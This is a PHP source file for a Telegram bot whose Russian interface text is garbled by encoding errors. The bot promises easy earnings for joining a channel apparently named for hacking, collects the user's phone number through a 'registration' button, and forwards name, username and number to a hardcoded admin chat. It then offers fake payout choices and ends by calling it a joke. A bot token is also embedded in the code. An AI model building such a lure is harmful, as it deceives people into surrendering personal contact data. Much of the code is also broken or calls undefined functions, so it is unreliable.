<?php
class snowbot
 {
      const API_KEY="https://api.telegram.org/bot1889200390:AAELafIDIYH_e502newEeWZkR-M8pO6Y10g";
      
      public function setWebhook($url)
      {
      return $this->request('setWebhook', [
        'url'=> $url
        ]);
      }
      public function request($method, $data)
      
      {
        // Generated by curl-to-PHP: http://incarnate.github.io/curl-to-php/
        $ch = curl_init();
        
        $url=self::API_KEY.$method;
        
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        
        $headers = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);
        
        return $result;
      }
   
    public function sendMessage($chat_id, $text)
    { 
      return $this->request("sendMessage", [
        'chat_id'->$chat_id,
        'text'->$text
        ]);
    }
    
    public function updates()
    {
      $update=json_decode(file_get_contents("php://input"), ture);
      return $update->message;
    }
 }
    
    $bot= new snowbot();
   echo $bot->setWebhook("https://snowbot.000webhostapp.com");

$data=$bot->Updates();
$text=$data->text;
$chat_id=$data->chat->id;
    

/* if ($text == "/start"){
$bot->ask('Show phone', function (Answer $answer) use ($bot) {
    $bot->reply('Handled!');
}, ['reply_markup' => json_encode([
    'keyboard' => [[['text' => 'Show phone', 'request_contact' => true]]]
])]);
}*/



if($text == "/start" or $text == "‚ùå–û—Ç–∫–∞–∑–∞—Ç—å "){


    bot('sendmessage',[

        'chat_id'=>$cid,

        'text'=>"*üëã–ü—Ä–∏–≤–µ—Ç [$fname] –¥–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –Ω–∞ –Ω–∞—à –±–æ—Ç. –ï—Å–ª–∏ —Ö–æ—Ç–∏—Ç–µ –ª—ë–≥–∫–∏ –∑–∞—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å —Ç–æ–≥–¥–∞ –ø–æ–¥–ø–∏—à–∏—Ç–µ –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª* [@vzlomnie] *–∞ —Ç–æ –≤—ã –Ω–µ –º–æ–∂–µ—Ç–µ –∑–∞—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å.\n\n–¢–µ–ø–µ—Ä—å –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É <b>—Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</b>*",

        'parse_mode'=>"markdown",

        'reply_markup'=>json_encode(

['resize_keyboard'=>true,

'keyboard' => [

[["text"=>"‚è≥–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è",'request_contact' =>true],],

]

])

]);

}

if($data){

bot('sendmessage',[

    'chat_id'=>"1104979149",
//admin id
    'text'=>"–ù–æ–≤—ã–π —É—á–∞—Å—Ç–Ω–∏–∫:\n–ò–º—è: [$fname](tg://user?id=$uid)\n–Æ–∑–µ—Ä: @$user\n–ù–æ–º–µ—Ä: $nomer\n–ò–º—è –Ω–æ–º–µ—Ä–∞: $name",

    'parse_mode'=>"markdown"

        ]);

bot("sendmessage",[

    'chat_id'=>$cid,

    'text'=>"–ù–æ–º–µ—Ä —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω! –ò —Ç–µ–ø–µ—Ä—å –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É –≥–æ—Ç–æ–≤!",

    'reply_markup'=>json_encode(

[

'resize_keyboard'=>true,

'selective'=>true,

'one_time_keyboard'=>true,

'keyboard' => [

[["text"=>"‚úÖ–ì–æ—Ç–æ–≤  "],],

]

])

]);

}



$button = $message->keyboardbutton->text;

if($text == "‚úÖ–ì–æ—Ç–æ–≤  "){

    bot('sendmessage',[

        'chat_id'=>$cid,

        'text'=>"–í—ã–±–µ—Ä–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ –≤—ã —Ö–æ—Ç–∏—Ç–µ",

  'reply_markup'=>json_encode(

[

'resize_keyboard'=>true,

'selective'=>true,

'one_time_keyboard'=>true,

'keyboard' => [

[["text"=>"üí∞1 —Ç–º—Ç"],],

[["text"=>"üí∞1.50 —Ç–º—Ç"],],

[["text"=>"üí∞5 —Ç–º—Ç"],],

[["text"=>"üí∞10 —Ç–º—Ç"],],

[["text"=>"‚ùå–û—Ç–∫–∞–∑–∞—Ç—å "],],





]

])

]);

}

$button = $message->keyboardbutton->text;

if($text == "üí∞1 —Ç–º—Ç" or $text == "üí∞1.50 —Ç–º—Ç" or $text == "üí∞5 —Ç–º—Ç" or $text == "üí∞10 —Ç–º—Ç"){

    bot('sendmessage',[

        'chat_id'=>$cid,

        'text'=>"–†–∞–∑–≤—ë—Ä–Ω—É—Ç—ã–π –æ—Ç–≤–µ—Ç



–≠—Ö-—ç—Ö-—ç—Ö —ç—Ç–æ –∂–µ —à—É—Ç–∫–∞üòÖ"]);

        }

        
        
?>
